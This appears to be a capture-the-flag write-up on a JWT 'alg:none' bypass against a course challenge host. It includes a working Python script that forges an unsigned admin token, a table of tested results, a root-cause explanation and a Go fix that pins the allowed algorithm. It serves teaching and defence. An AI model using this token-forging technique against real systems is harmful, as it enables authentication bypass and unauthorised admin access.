---
title: "None shall pass — JWT alg:none"
category: Crypto
host: none-shall-pass.is-course.ru
tags: [jwt, alg-none, cve-2025-59685]
technique: "`alg:none` unsigned token accepted (cookie `sess_id`)"
status: solved
---

# None shall pass

## Recon

Signup issues a JWT in the **`sess_id`** cookie; `/restricted` gates a page on it:

```json
{"alg":"HS256","typ":"JWT"}.{"admin":false,"username":"guest"}.<sig>
```

The verifier dispatches on `alg` *from the header* — the usual mistake.

## Exploit

Set `alg` to `none`, flip the claim, and drop the signature. Note the empty signature segment must still
be present (two dots at the end):

```python
import base64, json, requests

b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
tok = (b64(json.dumps({"alg":"none","typ":"JWT"}, separators=(",",":")).encode()) + b"." +
       b64(json.dumps({"admin":True,"username":"admin","role":"admin"},
                      separators=(",",":")).encode()) + b".")

r = requests.get("https://none-shall-pass.is-course.ru/restricted",
                 cookies={"sess_id": tok.decode()})
print(r.status_code, r.text)          # 200 YDS{…redacted…}
```

The `alg` value is matched **case-sensitively** in this deployment — measured:

| `alg` | Result |
|---|---|
| `none` | **200** — flag returned |
| `None` | 400 (generic error page) |
| `HS256` with empty signature | 400 |

That last row matters: an empty-signature HS256 is rejected, so this is not "any unsigned token
works" — it is specifically the `none` branch of the verifier.

## Root cause

`none` is a legitimate JOSE algorithm meaning "no signature". A verifier that reads the algorithm from
the token (rather than pinning an allowlist) will happily accept a token that authenticates *itself*.
The 2025 regression of this bug class (CVE-2025-59685 and friends) is a reminder that libraries
re-enable it whenever the key-function returns a key before checking the method.

## Fix

```go
token, err := jwt.ParseWithClaims(raw, &Claims{}, func(t *jwt.Token) (any, error) {
    if t.Method.Alg() != "HS256" {                 // allowlist, not a denylist
        return nil, errors.New("unexpected signing method")
    }
    return secret, nil
})
```

Better: pass `jwt.WithValidMethods([]string{"HS256"})`, and reject any token whose signature is empty
before it reaches the parser.
